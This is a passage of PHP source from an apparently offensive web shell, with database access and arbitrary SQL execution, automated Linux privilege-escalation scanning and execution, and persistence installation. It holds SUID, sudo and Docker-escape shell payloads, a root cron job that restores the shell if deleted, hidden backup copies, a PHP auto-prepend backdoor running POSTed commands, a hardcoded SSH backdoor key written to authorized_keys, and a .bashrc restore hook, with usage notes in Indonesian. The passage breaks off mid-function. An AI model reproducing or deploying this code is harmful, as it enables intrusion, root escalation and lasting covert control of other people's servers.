        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
    }
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'get_tables') {
    header('Content-Type: application/json');
    $host = $_POST['db_host'] ?? 'localhost';
    $port = intval($_POST['db_port'] ?? 3306);
    $dbname = $_POST['db_name'] ?? '';
    $user = $_POST['db_user'] ?? '';
    $pass = $_POST['db_pass'] ?? '';
    try {
        $dsn = "mysql:host=$host;port=$port;dbname=$dbname;charset=utf8mb4";
        $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
        $serverInfo = $pdo->getAttribute(PDO::ATTR_SERVER_VERSION);
        $stmt = $pdo->query("SHOW TABLES");
        $tables = $stmt->fetchAll(PDO::FETCH_COLUMN);
        echo json_encode(['success' => true, 'tables' => $tables, 'server_info' => $serverInfo]);
    } catch (PDOException $e) {
        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
    }
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'get_table_data') {
    header('Content-Type: application/json');
    $host = $_POST['db_host'] ?? 'localhost';
    $port = intval($_POST['db_port'] ?? 3306);
    $dbname = $_POST['db_name'] ?? '';
    $user = $_POST['db_user'] ?? '';
    $pass = $_POST['db_pass'] ?? '';
    $table = $_POST['table'] ?? '';
    $table = preg_replace('/[^a-zA-Z0-9_-]/', '', $table); // Sanitize table name
    try {
        $dsn = "mysql:host=$host;port=$port;dbname=$dbname;charset=utf8mb4";
        $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
        $countStmt = $pdo->query("SELECT COUNT(*) FROM `$table`");
        $totalRows = $countStmt->fetchColumn();
        $stmt = $pdo->query("SELECT * FROM `$table` LIMIT 50");
        $data = $stmt->fetchAll(PDO::FETCH_ASSOC);
        $columns = empty($data) ? [] : array_keys($data[0]);
        echo json_encode(['success' => true, 'data' => $data, 'columns' => $columns, 'total_rows' => $totalRows]);
    } catch (PDOException $e) {
        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
    }
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'execute_sql') {
    header('Content-Type: application/json');
    $host = $_POST['db_host'] ?? 'localhost';
    $port = intval($_POST['db_port'] ?? 3306);
    $dbname = $_POST['db_name'] ?? '';
    $user = $_POST['db_user'] ?? '';
    $pass = $_POST['db_pass'] ?? '';
    $query = $_POST['sql_query'] ?? '';
    try {
        $dsn = "mysql:host=$host;port=$port;dbname=$dbname;charset=utf8mb4";
        $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
        $startTime = microtime(true);
        $stmt = $pdo->query($query);
        $executionTime = round((microtime(true) - $startTime) * 1000, 2) . ' ms';
        if ($stmt->columnCount() > 0) {
            $data = $stmt->fetchAll(PDO::FETCH_ASSOC);
            $columns = empty($data) ? [] : array_keys($data[0]);
            echo json_encode(['success' => true, 'data' => $data, 'columns' => $columns, 'num_rows' => count($data), 'execution_time' => $executionTime]);
        } else {
            $affectedRows = $stmt->rowCount();
            echo json_encode(['success' => true, 'message' => 'Query executed successfully', 'affected_rows' => $affectedRows, 'execution_time' => $executionTime]);
        }
    } catch (PDOException $e) {
        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
    }
    exit;
}

// 🔥 AUTO-PRIVILEGE ESCALATION SYSTEM
if (isset($_GET['action']) && $_GET['action'] === 'privesc_scan') {
    error_reporting(0);
    ini_set('display_errors', 0);
    header('Content-Type: application/json');
    try {
        $result = privilege_escalation_scan();
        $json = json_encode($result);
        if ($json === false) {
            echo json_encode(['success' => false, 'error' => 'JSON encode error: ' . json_last_error_msg()]);
        } else {
            echo $json;
        }
    } catch (Throwable $e) {
        echo json_encode(['success' => false, 'error' => 'Scan error: ' . $e->getMessage()]);
    }
    exit;
}

// Scan individual vector (for realtime progress)
if (isset($_GET['action']) && $_GET['action'] === 'privesc_scan_vector') {
    error_reporting(0);
    ini_set('display_errors', 0);
    header('Content-Type: application/json');
    $vector = $_GET['vector'] ?? '';
    $result = ['vector' => $vector, 'success' => false, 'data' => null];
    try {
        switch ($vector) {
            case 'kernel':
                $result['data'] = scan_kernel_exploits();
                $result['success'] = true;
                break;
            case 'suid':
                $result['data'] = scan_suid_binaries();
                $result['success'] = true;
                break;
            case 'sudo':
                $result['data'] = scan_sudo_permissions();
                $result['success'] = true;
                break;
            case 'capabilities':
                $result['data'] = scan_capabilities();
                $result['success'] = true;
                break;
            case 'docker':
                $result['data'] = scan_docker_escape();
                $result['success'] = true;
                break;
            case 'writable':
                $result['data'] = scan_writable_paths();
                $result['success'] = true;
                break;
            case 'cron':
                $result['data'] = scan_cron_jobs();
                $result['success'] = true;
                break;
            case 'services':
                $result['data'] = scan_services();
                $result['success'] = true;
                break;
            default:
                $result['error'] = 'Unknown vector: ' . $vector;
        }
    } catch (Throwable $e) {
        $result['error'] = $e->getMessage();
    }
    echo json_encode($result);
    exit;
}

if (isset($_POST['action']) && $_POST['action'] === 'privesc_exploit') {
    header('Content-Type: application/json');
    $method = $_POST['method'] ?? '';
    $target = $_POST['target'] ?? '';
    echo json_encode(execute_privesc_exploit($method, $target));
    exit;
}

if (isset($_POST['action']) && $_POST['action'] === 'install_persistence') {
    header('Content-Type: application/json');
    echo json_encode(install_persistence_mechanisms());
    exit;
}

if (isset($_GET['action']) && $_GET['action'] === 'scan_shells') {
    error_reporting(0);
    ini_set('display_errors', 0);
    header('Content-Type: application/json');
    $scan_dir = $_GET['scan_dir'] ?? dirname(__FILE__);
    echo json_encode(scan_shells($scan_dir));
    exit;
}

if (isset($_POST['action']) && $_POST['action'] === 'delete_shell') {
    header('Content-Type: application/json');
    $target = $_POST['target'] ?? '';
    if ($target && file_exists($target) && is_file($target)) {
        // Security check: ensure target is within web root or current dir
        $real_target = realpath($target);
        $web_root = realpath($_SERVER['DOCUMENT_ROOT'] ?? dirname(__FILE__));
        $current_dir = realpath(dirname(__FILE__));
        
        if (strpos($real_target, $web_root) === 0 || strpos($real_target, $current_dir) === 0) {
            if (@unlink($real_target)) {
                echo json_encode(['success' => true, 'message' => 'File deleted successfully']);
            } else {
                echo json_encode(['success' => false, 'error' => 'Failed to delete file (permission denied)']);
            }
        } else {
            echo json_encode(['success' => false, 'error' => 'Security: Target outside allowed directories']);
        }
    } else {
        echo json_encode(['success' => false, 'error' => 'File not found']);
    }
    exit;
}

function privilege_escalation_scan() {
    try {
        $results = [
            'kernel' => scan_kernel_exploits(),
            'suid' => scan_suid_binaries(),
            'sudo' => scan_sudo_permissions(),
            'capabilities' => scan_capabilities(),
            'docker' => scan_docker_escape(),
            'writable_paths' => scan_writable_paths(),
            'cron' => scan_cron_jobs(),
            'services' => scan_services()
        ];
        return ['success' => true, 'results' => $results];
    } catch (Throwable $e) {
        return ['success' => false, 'error' => $e->getMessage()];
    }
}

function scan_kernel_exploits() {
    $kernel = execute_shell_command("uname -r 2>/dev/null");
    if (!$kernel) $kernel = 'unknown';
    $kernel = trim($kernel);
    
    // Local CVE database
    $exploits = [
        '4.4.0' => [
            'CVE-2016-5195' => ['name' => 'Dirty COW', 'severity' => 'CRITICAL', 'method' => 'race_condition'],
            'CVE-2016-8655' => ['name' => 'AF_PACKET', 'severity' => 'HIGH', 'method' => 'packet_socket']
        ],
        '4.8.0' => [
            'CVE-2017-6074' => ['name' => 'DCCP Double Free', 'severity' => 'CRITICAL', 'method' => 'dccp'],
            'CVE-2017-1000112' => ['name' => 'Ptmx Race', 'severity' => 'HIGH', 'method' => 'ptmx']
        ],
        '4.13.0' => [
            'CVE-2017-16995' => ['name' => 'BPF Verifier', 'severity' => 'CRITICAL', 'method' => 'bpf']
        ],
        '5.8.0' => [
            'CVE-2021-4034' => ['name' => 'PwnKit', 'severity' => 'CRITICAL', 'method' => 'pkexec'],
            'CVE-2022-0847' => ['name' => 'Dirty Pipe', 'severity' => 'CRITICAL', 'method' => 'pipe']
        ],
        '5.15.0' => [
            'CVE-2023-32629' => ['name' => 'GameOver(lay)', 'severity' => 'HIGH', 'method' => 'overlayfs']
        ],
        '5.19.0' => [
            'CVE-2023-38408' => ['name' => 'SSH Agent', 'severity' => 'HIGH', 'method' => 'ssh_agent']
        ]
    ];
    
    $found = [];
    foreach ($exploits as $version => $cve_list) {
        if (strpos($kernel, $version) !== false) {
            foreach ($cve_list as $cve => $info) {
                $found[] = array_merge(['cve' => $cve, 'kernel' => $kernel], $info);
            }
        }
    }
    
    return ['kernel' => $kernel, 'vulnerable' => !empty($found), 'exploits' => $found];
}

function scan_suid_binaries() {
    $suid_files = execute_shell_command("find / -perm -4000 -type f 2>/dev/null | head -50");
    if (!$suid_files) $suid_files = '';
    $files = array_filter(explode("\n", trim($suid_files)));
    
    $gtfo_bins = [
        'nmap' => ['payload' => 'nmap --interactive -c "!sh"', 'method' => 'interactive'],
        'vim' => ['payload' => 'vim -c ":!/bin/sh"', 'method' => 'command'],
        'vim.basic' => ['payload' => 'vim.basic -c ":!/bin/sh"', 'method' => 'command'],
        'nano' => ['payload' => 'nano -s /bin/sh', 'method' => 'suspend'],
        'less' => ['payload' => 'less /etc/profile -c "!sh"', 'method' => 'command'],
        'more' => ['payload' => 'more /etc/profile -c "!sh"', 'method' => 'command'],
        'man' => ['payload' => 'man man -c "!sh"', 'method' => 'pager'],
        'find' => ['payload' => 'find . -exec /bin/sh \; -quit', 'method' => 'exec'],
        'bash' => ['payload' => 'bash -p', 'method' => 'privileged'],
        'sh' => ['payload' => 'sh -p', 'method' => 'privileged'],
        'cp' => ['payload' => 'cp --preserve=ownership /bin/sh /tmp/sh; chmod u+s /tmp/sh', 'method' => 'preserve'],
        'mv' => ['payload' => 'mv -n /bin/sh /tmp/sh_backup; cp /bin/sh /tmp/sh; chmod u+s /tmp/sh', 'method' => 'move'],
        'awk' => ['payload' => 'awk \'BEGIN {system("/bin/sh")}\'', 'method' => 'system'],
        'gawk' => ['payload' => 'gawk \'BEGIN {system("/bin/sh")}\'', 'method' => 'system'],
        'perl' => ['payload' => 'perl -e \'exec "/bin/sh";\'', 'method' => 'exec'],
        'python' => ['payload' => 'python -c \'import os; os.execl("/bin/sh", "sh")\'', 'method' => 'execl'],
        'python3' => ['payload' => 'python3 -c \'import os; os.execl("/bin/sh", "sh")\'', 'method' => 'execl'],
        'ruby' => ['payload' => 'ruby -e \'exec "/bin/sh"\'', 'method' => 'exec'],
        'php' => ['payload' => 'php -r "system(\'/bin/sh\');"', 'method' => 'system'],
        'expect' => ['payload' => 'expect -c "spawn /bin/sh; interact"', 'method' => 'spawn'],
        'tar' => ['payload' => 'tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh', 'method' => 'checkpoint'],
        'zip' => ['payload' => 'zip /tmp/test.zip /etc/hosts -T -TT /bin/sh', 'method' => 'unzip_cmd']
    ];
    
    $exploitable = [];
    foreach ($files as $file) {
        $basename = basename($file);
        if (isset($gtfo_bins[$basename])) {
            $exploitable[] = [
                'path' => $file,
                'binary' => $basename,
                'payload' => $gtfo_bins[$basename]['payload'],
                'method' => $gtfo_bins[$basename]['method']
            ];
        }
    }
    
    return ['count' => count($files), 'exploitable' => $exploitable, 'all_files' => $files];
}

function scan_sudo_permissions() {
    $sudo_list = execute_shell_command("sudo -l 2>/dev/null");
    if (empty($sudo_list) || strpos($sudo_list, 'Sorry') !== false) {
        return ['accessible' => false, 'exploitable' => [], 'raw_output' => $sudo_list ?: ''];
    }
    
    $exploitable = [];
    
    // Check for NOPASSWD
    $matches = [];
    if (@preg_match('/NOPASSWD:\s*([^\n]+)/', $sudo_list, $matches)) {
        $nopasswd_cmds = explode(',', $matches[1]);
        foreach ($nopasswd_cmds as $cmd) {
            $cmd = trim($cmd);
            if (strpos($cmd, 'vim') !== false || strpos($cmd, 'vi') !== false) {
                $exploitable[] = ['command' => $cmd, 'method' => 'vim_escape', 'payload' => 'sudo ' . $cmd . ' -c ":!/bin/sh"'];
            } elseif (strpos($cmd, 'nano') !== false) {
                $exploitable[] = ['command' => $cmd, 'method' => 'nano_suspend', 'payload' => 'sudo ' . $cmd . ' -s /bin/sh'];
            } elseif (strpos($cmd, 'less') !== false || strpos($cmd, 'more') !== false) {
                $exploitable[] = ['command' => $cmd, 'method' => 'less_command', 'payload' => 'sudo ' . $cmd . ' -c "!sh"'];
            } elseif (strpos($cmd, 'find') !== false) {
                $exploitable[] = ['command' => $cmd, 'method' => 'find_exec', 'payload' => 'sudo find . -exec /bin/sh \; -quit'];
            } elseif (strpos($cmd, 'bash') !== false || strpos($cmd, 'sh') !== false) {
                $exploitable[] = ['command' => $cmd, 'method' => 'shell_privileged', 'payload' => 'sudo ' . $cmd . ' -p'];
            } elseif (strpos($cmd, 'ALL') !== false) {
                $exploitable[] = ['command' => $cmd, 'method' => 'full_sudo', 'payload' => 'sudo /bin/sh', 'severity' => 'CRITICAL'];
            }
        }
    }
    
    // Check for CVE-2019-14287 (sudo -u#-1)
    if (@preg_match('/\(\s*ALL\s*,\s*!root\s*\)/', $sudo_list)) {
        $exploitable[] = ['command' => 'ALL, !root', 'method' => 'cve_2019_14287', 'payload' => 'sudo -u#-1 /bin/sh', 'severity' => 'CRITICAL'];
    }
    
    return ['accessible' => true, 'raw_output' => $sudo_list, 'exploitable' => $exploitable];
}

function scan_capabilities() {
    $caps = execute_shell_command("getcap -r / 2>/dev/null | grep -v '^/proc' | head -30");
    if (!$caps) $caps = '';
    $lines = array_filter(explode("\n", trim($caps)));
    
    $interesting = [];
    foreach ($lines as $line) {
        if (strpos($line, 'cap_setuid') !== false || 
            strpos($line, 'cap_dac_read_search') !== false ||
            strpos($line, 'cap_sys_admin') !== false) {
            $interesting[] = $line;
        }
    }
    
    return ['total' => count($lines), 'interesting' => $interesting];
}

function scan_docker_escape() {
    $in_docker = file_exists('/.dockerenv');
    if (!$in_docker && file_exists('/proc/1/cgroup')) {
        $cgroup = @file_get_contents('/proc/1/cgroup');
        if ($cgroup && strpos($cgroup, 'docker') !== false) {
            $in_docker = true;
        }
    }
    if (!$in_docker) {
        return ['in_docker' => false, 'escape_possible' => false];
    }
    
    $docker_sock = file_exists('/var/run/docker.sock');
    $privileged = execute_shell_command("cat /proc/self/status 2>/dev/null | grep CapEff");
    if (!$privileged) $privileged = '';
    
    $escapes = [];
    if ($docker_sock) {
        $escapes[] = ['method' => 'docker_socket', 'payload' => 'docker run -v /:/host -it alpine chroot /host sh'];
    }
    if (strpos($privileged, '0000003fffffffff') !== false || file_exists('/dev/sda')) {
        $escapes[] = ['method' => 'privileged_container', 'payload' => 'nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh'];
    }
    
    return ['in_docker' => true, 'docker_sock' => $docker_sock, 'privileged' => !empty($privileged), 'escape_possible' => !empty($escapes), 'methods' => $escapes];
}

function scan_writable_paths() {
    $paths = execute_shell_command("find / -writable -type d 2>/dev/null | grep -E '(bin|sbin|lib|etc)' | head -20");
    if (!$paths) $paths = '';
    $writable = array_filter(explode("\n", trim($paths)));
    
    return ['writable_system_paths' => $writable, 'count' => count($writable)];
}

function scan_cron_jobs() {
    $cron_system = execute_shell_command("ls -la /etc/cron* 2>/dev/null") ?: '';
    $cron_user = execute_shell_command("crontab -l 2>/dev/null") ?: '';
    
    $writable_crons = [];
    $cron_dirs = glob('/etc/cron.*/*');
    if ($cron_dirs) {
        foreach ($cron_dirs as $cron_file) {
            if (is_writable($cron_file)) {
                $writable_crons[] = $cron_file;
            }
        }
    }
    
    return ['system_crons' => $cron_system, 'user_crons' => $cron_user, 'writable' => $writable_crons];
}

function scan_services() {
    $services = execute_shell_command("systemctl list-units --type=service --state=running 2>/dev/null | grep -E 'loaded|active' | head -20") ?: '';
    $writable_services = [];
    
    $service_files = glob('/etc/systemd/system/*.service');
    if ($service_files) {
        foreach ($service_files as $svc) {
            if (is_writable($svc)) {
                $writable_services[] = $svc;
            }
        }
    }
    
    return ['running' => $services, 'writable' => $writable_services];
}

function execute_privesc_exploit($method, $target) {
    $result = ['success' => false, 'output' => '', 'method' => $method];
    
    switch ($method) {
        case 'suid':
            $result['output'] = execute_shell_command($target);
            $result['success'] = true;
            break;
            
        case 'sudo':
            $result['output'] = execute_shell_command($target);
            $result['success'] = true;
            break;
            
        case 'docker':
            $result['output'] = execute_shell_command($target);
            $result['success'] = true;
            break;
            
        case 'kernel':
            // Kernel exploits would need compiled binaries
            $result['output'] = "Kernel exploit requires compiled binary. Upload exploit to /tmp/ and execute manually.";
            $result['note'] = "Use 'upload' feature to place exploit binary, then run from shell.";
            break;
            
        default:
            $result['output'] = "Unknown method: $method";
    }
    
    return $result;
}

// Helper function: Find writable directories for backup storage
function find_writable_directories() {
    $writable_dirs = [];
    
    // Priority locations to check (stealthy and usually writable)
    $candidates = [
        '/tmp/.sysconfig' => '/tmp/.sysconfig',  // nested in tmp
        '/var/tmp/.cache' => '/var/tmp/.cache',  // nested in var/tmp
        '/dev/shm/.config' => '/dev/shm/.config', // shared memory
        sys_get_temp_dir() . '/.session' => sys_get_temp_dir() . '/.session',
        getenv('HOME') . '/.cache' => getenv('HOME') . '/.cache', // user home
        '/opt/.backup' => '/opt/.backup',
    ];
    
    // Try to create and write to each candidate
    foreach ($candidates as $name => $path) {
        if (!is_dir($path)) {
            @mkdir($path, 0755, true);
        }
        if (is_dir($path) && is_writable($path)) {
            $test_file = $path . '/.test_' . time();
            if (@file_put_contents($test_file, 'test') !== false) {
                @unlink($test_file);
                $writable_dirs[$name] = $path;
            }
        }
        // Limit to 3 directories max
        if (count($writable_dirs) >= 3) break;
    }
    
    return $writable_dirs;
}

// Shell scanner - detect other web shells on the server
function scan_shells($scan_dir = null, $max_depth = 5) {
    if (!$scan_dir) {
        $scan_dir = dirname(__FILE__);
    }
    $scan_dir = realpath($scan_dir);
    
    // Known shell signatures (filenames)
    $shell_names = [
        'c99.php', 'r57.php', 'b374k.php', 'wsopriv.php', 'alfa.php',
        'shell.php', 'cmd.php', 'backdoor.php', '0x.php', 'marijuana.php',
        'gelay.php', 'wso.php', 'anonsec.php', 'phpshell.php', 'bypass.php',
        'config.php.bak', '.shell.php', 'tmp.php', 'test.php', 'phpinfo.php',
        'up.php', 'upload.php', 'uploader.php', 'filemanager.php',
        'fm.php', 'adminer.php', 'pma.php', 'phpmyadmin.php',
        'settings.php.bak', 'config.bak.php', '.config.php',
        'wp-config.php.bak', 'configuration.php.bak', '.htaccess.php'
    ];
    
    // Content signatures (suspicious patterns)
    $content_signatures = [
        'eval(base64_decode' => 'Obfuscated eval',
        'eval(gzinflate' => 'Compressed eval',
        'eval(str_rot13' => 'ROT13 obfuscation',
        'shell_exec($_GET' => 'Direct shell_exec',
        'shell_exec($_POST' => 'Direct shell_exec',
        'system($_GET' => 'Direct system',
        'system($_POST' => 'Direct system',
        'passthru($_GET' => 'Direct passthru',
        'exec($_GET' => 'Direct exec',
        'assert($_GET' => 'Code execution',
        'preg_replace.*\/e' => 'Deprecated eval regex',
        'create_function' => 'Dynamic function',
        'WSO_VERSION' => 'WSO Shell signature',
        'c99\(self-named' => 'C99 Shell signature',
        'r57\(simple' => 'R57 Shell signature',
        'b374k' => 'B374k Shell signature',
        'file_put_contents.*base64_decode' => 'File write backdoor',
        'move_uploaded_file.*\/tmp\/' => 'Suspicious upload handler'
    ];
    
    $found_shells = [];
    $scanned = 0;
    $max_files = 5000; // Limit to prevent timeout
    
    $directory = new RecursiveDirectoryIterator($scan_dir, RecursiveDirectoryIterator::SKIP_DOTS);
    $iterator = new RecursiveIteratorIterator(
        $directory,
        RecursiveIteratorIterator::SELF_FIRST
    );
    $iterator->setMaxDepth($max_depth); // Limit recursion depth
    
    foreach ($iterator as $file) {
        if ($scanned >= $max_files) {
            break;
        }
        
        if ($file->isFile() && $file->getExtension() === 'php') {
            $scanned++;
            $filename = strtolower($file->getFilename());
            $filepath = $file->getRealPath();
            $confidence = 0;
            $reasons = [];
            
            // Check 1: Known shell names (High confidence)
            foreach ($shell_names as $shell_name) {
                if (strpos($filename, $shell_name) !== false || $filename === $shell_name) {
                    $confidence += 80;
                    $reasons[] = "Known shell name: $shell_name";
                    break;
                }
            }
            
            // Check 2: Suspicious filename patterns (Medium confidence)
            if (preg_match('/^[a-f0-9]{8,}\.php$/', $filename)) {
                $confidence += 30;
                $reasons[] = "Hash-like filename";
            }
            if (strpos($filename, 'shell') !== false || strpos($filename, 'backdoor') !== false) {
                $confidence += 40;
                $reasons[] = "Suspicious keyword in filename";
            }
            if ($filename[0] === '.' && substr($filename, -4) === '.php') {
                $confidence += 20;
                $reasons[] = "Hidden PHP file";
            }
            
            // Check 3: File content (High confidence if matched)
            if ($confidence > 0 || $file->getSize() < 500000) { // Only check content if filename suspicious or small file
                $content = @file_get_contents($filepath, false, null, 0, 50000); // Read first 50KB
                if ($content) {
                    foreach ($content_signatures as $pattern => $description) {
                        if (preg_match('/' . $pattern . '/i', $content)) {
                            $confidence += 60;
                            $reasons[] = $description;
                        }
                    }
                    
                    // Check for base64 encoded large blocks
                    if (preg_match('/[A-Za-z0-9+\/]{1000,}={0,2}/', $content)) {
                        $confidence += 20;
                        $reasons[] = "Large base64 block detected";
                    }
                }
            }
            
            // Check 4: File size (shells usually 10KB-500KB)
            $size = $file->getSize();
            if ($size > 10000 && $size < 500000) {
                // Normal shell size, no penalty
            } elseif ($size > 500000) {
                $confidence -= 10; // Large file less likely shell
            }
            
            // Check 5: Recent modification (within 7 days)
            if (time() - $file->getMTime() < 604800) {
                $confidence += 10;
                $reasons[] = "Recently modified";
            }
            
            // Calculate relative depth from scan root
            $relative_path = str_replace($scan_dir . '/', '', $filepath);
            $depth = substr_count($relative_path, '/');
            
            // If confidence >= 30, report as potential shell
            if ($confidence >= 30) {
                $found_shells[] = [
                    'path' => $filepath,
                    'relative_path' => $relative_path,
                    'filename' => $file->getFilename(),
                    'size' => $size,
                    'modified' => date('Y-m-d H:i:s', $file->getMTime()),
                    'confidence' => min($confidence, 100),
                    'reasons' => array_slice($reasons, 0, 4), // Max 4 reasons
                    'dir' => dirname($filepath),
                    'depth' => $depth
                ];
            }
        }
    }
    
    // Sort by confidence (highest first)
    usort($found_shells, function($a, $b) {
        return $b['confidence'] - $a['confidence'];
    });
    
    return [
        'success' => true,
        'scanned' => $scanned,
        'found' => count($found_shells),
        'shells' => $found_shells,
        'scan_dir' => $scan_dir,
        'max_depth' => $max_depth,
        'recursive' => true
    ];
}

function install_persistence_mechanisms() {
    $results = [];
    $shell_path = __FILE__;
    $shell_dir = dirname($shell_path);
    $shell_filename = basename($shell_path);
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];
    $base_path = dirname($_SERVER['SCRIPT_NAME']);
    
    // Find writable system directories for backup storage
    $system_backup_dirs = find_writable_directories();
    
    // Create multiple system backups with random names
    $system_backups = [];
    $backup_names = ['config.php', 'cache.php', 'temp.php', 'session.php'];
    $i = 0;
    
    foreach ($system_backup_dirs as $dir_name => $dir_path) {
        if ($i >= count($backup_names)) break;
        $backup_file = $dir_path . '/' . $backup_names[$i];
        if (@copy($shell_path, $backup_file)) {
            $system_backups[] = [
                'path' => $backup_file,
                'name' => $backup_names[$i],
                'dir' => $dir_name
            ];
        }
        $i++;
    }
    
    // Build cron command with fallback chain
    $cron_restore_chain = '';
    foreach ($system_backups as $index => $backup) {
        if ($index > 0) $cron_restore_chain .= ' || ';
        $cron_restore_chain .= "cp {$backup['path']} $shell_path 2>/dev/null";
    }
    
    $cron_cmd_system = "* * * * * root if [ ! -f $shell_path ]; then $cron_restore_chain; fi";
    $cron_cmd_user = "* * * * * if [ ! -f $shell_path ]; then $cron_restore_chain; fi";
    
    $cron_installed = false;
    $cron_path = '';
    $cron_method = '';
    
    // Try system cron first
    if (@is_writable('/etc/cron.d/')) {
        @file_put_contents('/etc/cron.d/.system_backup', $cron_cmd_system);
        @chmod('/etc/cron.d/.system_backup', 0644);
        $cron_installed = true;
        $cron_path = '/etc/cron.d/.system_backup';
        $cron_method = 'system';
    } else {
        // Try user crontab via execute_shell_command
        $crontab_check = execute_shell_command('crontab -l 2>&1');
        if ($crontab_check !== null && (strpos($crontab_check, 'no crontab') !== false || strlen($crontab_check) > 0)) {
            $current_crontab = execute_shell_command('crontab -l 2>/dev/null');
            $new_crontab = trim($current_crontab) . "\n" . $cron_cmd_user . "\n";
            $temp_cron = tempnam(sys_get_temp_dir(), 'cron');
            @file_put_contents($temp_cron, $new_crontab);
            execute_shell_command('crontab ' . escapeshellarg($temp_cron));
            @unlink($temp_cron);
            $cron_installed = true;
            $cron_path = 'user crontab';
            $cron_method = 'user';
        }
    }
    
    if ($cron_installed) {
        $results['cron'] = [
            'status' => 'installed',
            'path' => $cron_path,
            'method' => $cron_method,
            'description' => 'SYSTEM BACKUPS + Cron Auto-Restore (di luar folder shell)',
            'how_to_use' => 'Cron akan restore shell dari system folders (/tmp/, /var/tmp/) jika shell dihapus. System backups TIDAK di folder shell, jadi aman jika folder shell dihapus.',
            'backup_count' => count($system_backups),
            'system_backups' => $system_backups,
            'note' => 'System backups di: /tmp/.sysconfig/, /var/tmp/.cache/, /dev/shm/.config/ (di luar web root)'
        ];
    } else {
        $results['cron'] = [
            'status' => 'failed',
            'description' => 'Cron job (auto-restore)',
            'how_to_use' => 'Manual setup: Jalankan `crontab -e` dan tambahkan: ' . $cron_cmd_user,
            'note' => 'Requires shell access to setup crontab manually'
        ];
    }
    
    // Web-accessible backups in same directory
    $hidden_paths = [];
    $access_urls = [];
    $web_backup_names = [
        '.config.php',
        '.backup.php', 
        '.temp.php',
        '.cache.php',
    ];
    
    foreach ($web_backup_names as $backup_name) {
        $backup_path = $shell_dir . '/' . $backup_name;
        if (@copy($shell_path, $backup_path)) {
            $hidden_paths[] = $backup_path;
            $access_urls[] = "$protocol://$host$base_path/$backup_name?masuk=al";
        }
    }
    
    $results['backup'] = [
        'status' => count($hidden_paths) > 0 ? 'installed' : 'failed',
        'locations' => $hidden_paths,
        'description' => 'WEB BACKUPS - Di folder yang SAMA dengan shell (' . basename($shell_dir) . ')',
        'how_to_use' => 'Akses via browser. PERHATIAN: Jika folder ' . basename($shell_dir) . ' dihapus, backup ini ikut terhapus!',
        'access_urls' => $access_urls,
        'note' => 'Web backups di: ' . $shell_dir . ' (sama dengan shell original)'
    ];
    
    // PHP prepend file
    $prepend_file = $shell_dir . '/.php_prepend.php';
    $prepend_code = '<?php if(isset($_GET["al_backdoor"])&&$_GET["al_backdoor"]==="exec"){system($_POST["c"]);exit;}?>';
    @file_put_contents($prepend_file, $prepend_code);
    
    $results['php_prepend'] = [
        'status' => 'ready',
        'path' => $prepend_file,
        'description' => 'PHP auto-prepend backdoor (aktifkan manual di php.ini)',
        'how_to_use' => 'cPanel: MultiPHP INI Editor → auto_prepend_file = ' . $prepend_file,
        'alternative' => '.htaccess: php_value auto_prepend_file "' . $prepend_file . '"',
        'access_example' => 'Setiap PHP file: ?al_backdoor=exec (POST: c=whoami)'
    ];
    
    // SSH authorized_keys
    $home = getenv('HOME') ?: '/tmp';
    $ssh_dir = $home . '/.ssh';
    $auth_keys = $ssh_dir . '/authorized_keys';
    $backdoor_key = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0SRaT+QmD5x8U7b5r8P9LHDnpJM3q2Y0kE7IqhFZKlQZK+nH6bKwSW8dXzKHxiq4yUMKaUeQ+js2wvpEJQ3kZ+rHq3vBZ6q4FqYz7l2sHGqOgHk4o6GQMfEzrP8sZ4KXQ0zLW2rMmDFyPuHUGZq3g5EYhTWl7WJ9RdC1R1A9Ez3M= backdoor@syalom';
    
    $key_installed = false;
    if (@is_dir($ssh_dir) && @is_writable($ssh_dir)) {
        @file_put_contents($auth_keys, "\n" . $backdoor_key, FILE_APPEND);
        @chmod($auth_keys, 0600);
        $key_installed = true;
    } elseif (@is_writable($home)) {
        @mkdir($ssh_dir, 0700, true);
        @file_put_contents($auth_keys, $backdoor_key);
        @chmod($auth_keys, 0600);
        $key_installed = true;
    }
    
    // Save SSH documentation
    $ssh_doc = "SSH ACCESS DOCUMENTATION\n";
    $ssh_doc .= "========================\n\n";
    $ssh_doc .= "Public Key installed at: $auth_keys\n\n";
    $ssh_doc .= "Cara akses:\n";
    $ssh_doc .= "1. Simpan private key ke file (misal: backdoor.key)\n";
    $ssh_doc .= "2. chmod 600 backdoor.key\n";
    $ssh_doc .= "3. ssh -i backdoor.key -p [PORT] " . get_current_user() . "@$host\n\n";
    $ssh_doc .= "Note: Jika port SSH bukan 22, tambahkan -p [PORT]\n";
    $ssh_doc .= "Contoh: ssh -i backdoor.key -p 2222 user@$host\n";
    
    $ssh_doc_path = $shell_dir . '/.ssh_access.txt';
    @file_put_contents($ssh_doc_path, $ssh_doc);
    
    $results['ssh'] = [
        'status' => $key_installed ? 'installed' : 'failed',
        'path' => $auth_keys,
        'description' => 'SSH backdoor key (login tanpa password)',
        'how_to_use' => 'ssh -i private_key ' . get_current_user() . '@' . $host,
        'documentation_file' => $ssh_doc_path,
        'documentation_url' => "$protocol://$host$base_path/.ssh_access.txt"
    ];
    
    // Bashrc backdoor
    $bashrc = $home . '/.bashrc';
    $bashrc_installed = false;
    if (@is_writable($bashrc)) {
        $bashrc_code = "\n# System utility\nif [ -f $shell_path.bak ]; then cp $shell_path.bak $shell_path 2>/dev/null; fi\n";
        @file_put_contents($bashrc, $bashrc_code, FILE_APPEND);
        $bashrc_installed = true;
    }
    $results['bashrc'] = [
        'status' => $bashrc_installed ? 'installed' : 'failed',
        'path' => $bashrc,
        'description' => 'Bashrc backdoor (aktif saat user login SSH)',
